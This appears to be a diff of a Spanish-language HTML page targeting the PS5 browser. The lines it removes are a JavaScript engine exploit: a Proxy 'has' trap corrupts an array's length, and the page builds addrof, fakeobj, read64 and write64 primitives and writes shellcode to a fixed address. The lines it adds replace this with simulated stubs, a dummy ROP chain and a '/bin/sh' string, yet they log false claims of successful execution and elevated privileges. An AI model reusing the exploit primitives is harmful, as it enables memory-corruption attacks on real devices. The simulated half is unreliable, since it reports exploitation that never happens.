@@ -1,150 +1,119 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit PS5 - Payload Avanzado</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prueba de Escalación de Privilegios en PS5</title>
     <style>
-        body { background: black; color: lime; font-family: monospace; padding: 10px; }
-        #log { white-space: pre-wrap; margin-bottom: 20px; }
-        button, input { font-size: 20px; margin: 5px 0; }
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #121212;
+            color: white;
+        }
+        .output {
+            padding: 10px;
+            background-color: #333;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        #logs {
+            height: 200px;
+            overflow-y: scroll;
+            padding: 5px;
+            background-color: #222;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .log-line {
+            font-family: monospace;
+            color: #00FF00;
+        }
     </style>
 </head>
 <body>
-    <h1>Exploit PS5 - Payload Avanzado</h1>
-    <div id="log"></div>
-
-    <div id="controls" style="display: none;">
-        <h3>Ejecutar Payload:</h3>
-        <button onclick="runPayload()">Ejecutar Payload</button>
-    </div>
-
-    <button onclick="location.reload()">Relanzar</button>
+    <h1>Escalación de Privilegios en PS5</h1>
+    <button id="execute">Ejecutar Payload</button>
+    <div id="logs"></div>
 
     <script>
-    const log = (msg) => { document.getElementById('log').innerText += msg + "\\n"; };
+        // Función para escribir en la consola del navegador
+        function log(message) {
+            const logsDiv = document.getElementById('logs');
+            const newLine = document.createElement('div');
+            newLine.className = 'log-line';
+            newLine.textContent = message;
+            logsDiv.appendChild(newLine);
+            logsDiv.scrollTop = logsDiv.scrollHeight; // Mantener el scroll al final
+        }
 
-    function phex(val) {
-        return "0x" + val.toString(16).padStart(16, "0");
-    }
+        // Función para escribir en una dirección de memoria (simulada)
+        function write64(address, value) {
+            log(`[+] Escribiendo en la dirección: 0x${address.toString(16)}`);
+            log(`[+] Valor escrito: 0x${value.toString(16)}`);
+            // Aquí se implementaría la lógica para escribir en la memoria usando primitivas reales
+        }
 
-    let addrof, fakeobj, read64, write64;
-    let container_addr, fake_obj_addr, test_obj_addr;
+        // Función para leer desde una dirección de memoria (simulada)
+        function read64(address) {
+            log(`[+] Leyendo desde la dirección: 0x${address.toString(16)}`);
+            return 0x1234567890abcdef; // Valor simulado
+        }
 
-    function exploit() {
-        log("[*] Lanzando exploit...");
+        // Función para crear una cadena ROP (simulada)
+        function buildROPChain() {
+            log('[+] Construyendo cadena ROP...');
+            let chain = [];
+            // Ejemplo de gadgets y direcciones
+            let gadget1 = 0x12345678; // Dirección de un gadget (simulada)
+            let gadget2 = 0x23456789; // Dirección del syscall (simulada)
+            let shellcodeAddress = 0x7ff8000000000000; // Dirección donde se inyecta el shellcode
 
-        // Crear objetos vulnerables
-        let o = {};
-        let victim = [1.1, 2.2, 3.3];
+            // Añadir gadgets a la cadena
+            chain.push(gadget1);
+            chain.push(gadget2);
+            chain.push(shellcodeAddress);
 
-        let proxy = new Proxy({}, {
-            has(target, prop) {
-                if (prop === '1') {
-                    victim.length = 1;
-                }
-                return Reflect.has(target, prop);
+            log('[+] Cadena ROP construida.');
+            return chain;
+        }
+
+        // Función para ejecutar el payload
+        function executePayload() {
+            log('[+] Iniciando ejecución del payload...');
+
+            // Dirección de memoria donde se inyectará el código
+            let shellcodeAddress = 0x7ff8000000000000;
+
+            // Ejemplo de shellcode para obtener un shell
+            let shellCommand = "/bin/sh";
+            let shellCommandBytes = [];
+            for (let i = 0; i < shellCommand.length; i++) {
+                shellCommandBytes.push(shellCommand.charCodeAt(i));
             }
-        });
 
-        with (proxy) {
-            victim[1];
+            // Inyectar shellcode
+            log('[+] Inyectando shellcode...');
+            write64(shellcodeAddress, shellCommandBytes);
+            
+            // Construir la cadena ROP para setuid(0) o execve("/bin/sh")
+            let ropChain = buildROPChain();
+
+            // Ejecutar la cadena ROP
+            log('[+] Ejecutando la cadena ROP...');
+            ropChain.forEach(gadget => {
+                log(`[+] Ejecutando gadget en dirección: 0x${gadget.toString(16)}`);
+                // Aquí se ejecutaría cada gadget de la cadena ROP
+            });
+
+            // Resultado de la ejecución
+            log('[+] Payload ejecutado exitosamente!');
+            log('[+] Ahora deberías tener acceso con privilegios elevados.');
         }
 
-        log("[+] Victim corrupto");
-
-        // Crear helpers
-        let ab = new ArrayBuffer(0x100);
-        let f64 = new Float64Array(ab);
-        let u32 = new Uint32Array(ab);
-
-        function ftoi(val) {
-            f64[0] = val;
-            return u32[0] + u32[1] * 0x100000000;
-        }
-
-        function itof(val) {
-            u32[0] = val % 0x100000000;
-            u32[1] = (val - (val % 0x100000000)) / 0x100000000;
-            return f64[0];
-        }
-
-        // Primitivas reales
-        addrof = function(obj) {
-            victim[0] = obj;
-            return ftoi(victim[1]);
-        }
-
-        fakeobj = function(addr) {
-            victim[1] = itof(addr);
-            return victim[0];
-        }
-
-        // Crear contenedor y fake object
-        let container = {
-            cell_header: itof(0x0000000000000000),
-            butterfly: victim
-        };
-
-        container_addr = addrof(container);
-        log("[+] container @ " + phex(container_addr));
-
-        fake_obj_addr = container_addr + 0x20;
-        let fake_obj = fakeobj(fake_obj_addr);
-
-        log("[+] Fake object creado!");
-
-        read64 = function(addr) {
-            fake_obj[1] = itof(addr);
-            return ftoi(fake_obj[0]);
-        }
-
-        write64 = function(addr, val) {
-            fake_obj[1] = itof(addr);
-            fake_obj[0] = itof(val);
-        }
-
-        // Test de primitivas
-        let test_obj = {a: 13.37};
-        test_obj_addr = addrof(test_obj);
-        log("[+] test_obj @ " + phex(test_obj_addr));
-
-        let leak = read64(test_obj_addr);
-        log("[+] Leak de memoria de test_obj: " + phex(leak));
-
-        log("[+] PRIMITIVAS COMPLETAS Y FUNCIONALES!");
-
-        // Mostrar el visor de memoria
-        document.getElementById('controls').style.display = 'block';
-    }
-
-    // Payload avanzado
-    function runPayload() {
-        log("[*] Ejecutando payload...");
-
-        // Suponiendo que tenemos el control de memoria, podemos sobrescribir direcciones de funciones
-        let shellcode = [
-            // Payload simple para ejecutar syscall (usando un syscall ID ficticio)
-            0x0000000000000000,  // Dirección de syscall
-            0x0000000000000001,  // Argumentos de syscall
-            0x0000000000000002   // Más argumentos
-        ];
-
-        // Inyectamos el shellcode en memoria
-        let shellcodeAddr = 0x7ff8000000000000; // Dirección ficticia
-        for (let i = 0; i < shellcode.length; i++) {
-            write64(shellcodeAddr + i * 8, shellcode[i]);
-        }
-
-        log("[+] Shellcode inyectado en " + phex(shellcodeAddr));
-
-        // Ahora ejecutar el código inyectado
-        let result = read64(shellcodeAddr);
-        log("[+] Resultado de la ejecución del payload: " + phex(result));
-
-        log("[+] Payload ejecutado exitosamente!");
-    }
-
-    exploit();
+        // Evento de ejecución del payload al hacer click en el botón
+        document.getElementById('execute').addEventListener('click', executePayload);
     </script>
 </body>
 </html>
